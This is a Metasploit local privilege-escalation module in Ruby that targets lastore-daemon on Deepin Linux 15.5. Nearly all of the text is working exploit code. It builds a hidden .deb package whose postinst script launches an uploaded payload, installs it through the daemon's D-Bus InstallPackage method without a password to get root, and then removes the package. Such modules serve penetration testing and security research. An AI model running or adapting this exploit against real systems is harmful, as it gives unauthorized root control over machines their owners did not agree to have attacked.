# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;lastore-daemon D-Bus Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This module attempts to gain root privileges on Deepin Linux systems
        by using lastore-daemon to install a package.

        The lastore-daemon D-Bus configuration on Deepin Linux 15.5 permits any
        user in the sudo group to install arbitrary system packages without
        providing a password, resulting in code execution as root. By default,
        the first user created on the system is a member of the sudo group.

        This module has been tested successfully with lastore-daemon version
        0.9.53-1 on Deepin Linux 15.5 (x64).
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          "King&#039;s Way",   # Discovery and exploit
          &#039;Brendan Coles&#039; # Metasploit
        ],
      &#039;DisclosureDate&#039; => &#039;Feb 2 2016&#039;,
      &#039;References&#039;     =>
        [
          [ &#039;EDB&#039;, &#039;39433&#039; ],
          [ &#039;URL&#039;, &#039;https://gist.github.com/bcoles/02aa274ce32dc350e34b6d4d1ad0e0e8&#039; ],
        ],
      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;Arch&#039;           => [ ARCH_X86, ARCH_X64 ],
      &#039;Targets&#039;        => [[ &#039;Auto&#039;, {} ]],
      &#039;DefaultTarget&#039;  => 0))
    register_options([
      OptString.new(&#039;WritableDir&#039;, [ true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039; ])
    ])
  end

  def base_dir
    datastore[&#039;WritableDir&#039;]
  end

  def mkdir(path)
    vprint_status "Creating &#039;#{path}&#039; directory"
    cmd_exec "mkdir -p #{path}"
    register_dir_for_cleanup path
  end

  def upload(path, data)
    print_status "Writing &#039;#{path}&#039; (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    register_file_for_cleanup path
  end

  def upload_and_chmodx(path, data)
    upload path, data
    cmd_exec "chmod +x &#039;#{path}&#039;"
  end

  def command_exists?(cmd)
    cmd_exec("command -v #{cmd} && echo true").include? &#039;true&#039;
  end

  def dbus_priv?
    res = install_package &#039;&#039;, &#039;&#039;
    (res.include? &#039;DBus.Error.AccessDenied&#039;) ? false : true
  end

  def install_package(name, path)
    dbus_send dest: &#039;com.deepin.lastore&#039;,
              type: &#039;method_call&#039;,
              path: &#039;/com/deepin/lastore&#039;,
              interface: &#039;com.deepin.lastore.Manager.InstallPackage&#039;,
              contents: "string:&#039;#{name}&#039; string:&#039;#{path}&#039;"
  end

  def remove_package(name)
    dbus_send dest: &#039;com.deepin.lastore&#039;,
              type: &#039;method_call&#039;,
              path: &#039;/com/deepin/lastore&#039;,
              interface: &#039;com.deepin.lastore.Manager.RemovePackage&#039;,
              contents: "string:&#039; &#039; string:&#039;#{name}&#039;"
  end

  def dbus_send(dest:, type:, path:, interface:, contents:)
    cmd_exec "dbus-send --system --print-reply --dest=#{dest} --type=#{type} #{path} #{interface} #{contents}"
  end

  def check
    %w(lastore-daemon dpkg-deb dbus-send).each do |cmd|
      unless command_exists? cmd
        vprint_error "#{cmd} is not installed. Exploitation will fail."
        return CheckCode::Safe
      end
      vprint_good "#{cmd} is installed"
    end

    unless dbus_priv?
      vprint_error &#039;User is not permitted to install packages. Exploitation will fail.&#039;
      return CheckCode::Safe
    end
    vprint_good &#039;User is permitted to install packages&#039;

    CheckCode::Appears
  end

  def exploit
    if is_root?
      fail_with Failure::BadConfig, &#039;Session already has root privileges&#039;
    end

    if check != CheckCode::Appears
      fail_with Failure::NotVulnerable, &#039;Target is not vulnerable&#039;
    end

    print_status &#039;Building package...&#039;

    payload_name = ".#{rand_text_alphanumeric rand(10..15)}"
    payload_path = "#{base_dir}/#{payload_name}"
    pkg_name = rand_text_alphanumeric rand(10..15)
    pkg_path = "#{base_dir}/.#{pkg_name}"

    mkdir "#{pkg_path}/DEBIAN"
    pkg = "Package: #{pkg_name}\n"
    pkg << "Version: 0.1\n"
    pkg << "Maintainer: #{pkg_name}\n"
    pkg << "Architecture: all\n"
    pkg << "Description: #{pkg_name}\n"
    upload "#{pkg_path}/DEBIAN/control", pkg
    upload_and_chmodx "#{pkg_path}/DEBIAN/postinst", "#!/bin/sh\n#{payload_path} &"

    cmd_exec "dpkg-deb --build &#039;#{pkg_path}&#039;"

    unless file_exist? "#{pkg_path}.deb"
      fail_with Failure::Unknown, &#039;Building package failed&#039;
    end

    print_status &#039;Uploading payload...&#039;
    upload_and_chmodx payload_path, generate_payload_exe

    print_status &#039;Installing package...&#039;
    res = install_package pkg_name, "#{pkg_path}.deb"
    vprint_line res

    unless res.include? &#039;object path&#039;
      fail_with Failure::Unknown, &#039;Package installation failed. Check /var/log/lastore/daemon.log&#039;
    end

    Rex.sleep 15

    print_status &#039;Removing package...&#039;
    res = remove_package pkg_name.downcase
    vprint_line res

    unless res.include? &#039;object path&#039;
      print_warning &#039;Package removal failed. Check /var/log/lastore/daemon.log&#039;
    end
  end
end

